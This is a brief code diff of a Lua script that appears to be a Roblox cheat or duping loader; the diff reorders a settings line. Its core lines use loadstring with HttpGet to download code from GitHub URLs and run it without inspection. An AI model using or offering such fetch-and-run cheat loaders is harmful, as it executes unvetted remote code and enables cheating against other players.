@@ -1,6 +1,6 @@
-getgenv().gui = false
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXDUP1NG/roblox/main/Script"))()
+
+getgenv().gui = false
 
 
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
